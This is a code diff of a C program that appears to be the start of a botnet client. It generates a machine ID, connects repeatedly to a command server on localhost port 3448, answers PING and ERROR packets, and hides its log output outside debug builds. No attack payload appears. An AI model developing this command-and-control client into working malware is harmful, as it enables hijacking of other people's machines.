@@ -24,6 +24,7 @@ uint32_t table_key = 0xdeadbeef; // util_strxor; For packets only?
 static volatile int sockfd = -1;
 static char uniq_id[32] = "";
 
+#ifdef DEBUG
 static void init_exit(void)
 {	
 	util_msgc("Info", "Process ran for %ld second(s).", 
@@ -49,10 +50,9 @@ static void init_signals(void)
     sa.sa_flags = 0;
     sigaction(SIGINT, &sa, 0);
 	
-#ifdef DEBUG
 	util_msgc("Info", "Initiated Signals!");
-#endif
 }
+#endif
 
 static void init_uniq_id(void)
 {
@@ -65,7 +65,7 @@ static void init_uniq_id(void)
 #ifdef DEBUG
 		util_msgc("Error", "open(urandom)");
 #endif
-		_exit(1);
+		_exit(EXIT_FAILURE);
 	}
 	
 	rc = read(fd, tmp_uniqid, 20);
@@ -74,7 +74,7 @@ static void init_uniq_id(void)
 #ifdef DEBUG
 		util_msgc("Error", "read(urandom)");
 #endif
-		_exit(1);
+		_exit(EXIT_FAILURE);
 	}
 		
 	close(fd);
@@ -82,11 +82,13 @@ static void init_uniq_id(void)
 	for(offset = 0; offset < 20; offset++)
 	{
 		sprintf((final_uniqid + (2 * offset)), 
-				"%02x", tmp_uniqid[offset] & 0xff);
+			"%02x", tmp_uniqid[offset] & 0xff);
 	}
 	
 	sprintf(uniq_id, "%s", final_uniqid);
+#ifdef DEBUG
 	util_msgc("Info", "Your Machine ID is %s", uniq_id);
+#endif
 	
     {
         unsigned seed;
@@ -98,7 +100,9 @@ static void init_uniq_id(void)
 int main(int argc, char *argv[])
 {
 	proc_startup = time(NULL);
+#ifdef DEBUG
 	init_signals();
+#endif
 	init_uniq_id();
 	
 	while((sockfd = net_connect("localhost", "3448", IPPROTO_TCP)) <= 0)
@@ -135,14 +139,24 @@ int main(int argc, char *argv[])
 			// Packet received
 			util_msgc("Info", "We've received a %s!", util_type2str(pkt.type));
 #endif
-			
 			switch(pkt.type)
 			{
 				case PING:
+#ifdef DEBUG
+					util_msgc("Info", "Ping from cnc!");
+#endif
 					net_fdsend(sockfd, PONG, "");
+				break;
+				
+				case ERROR:
+#ifdef DEBUG
+					util_msgc("Info", "Error from cnc!");
+#endif
+					net_fdsend(sockfd, ERROR, "ACK");
 				break;
 			}
 		} // While
+		sleep(1);
 	} // While
 	
 	close(sockfd);
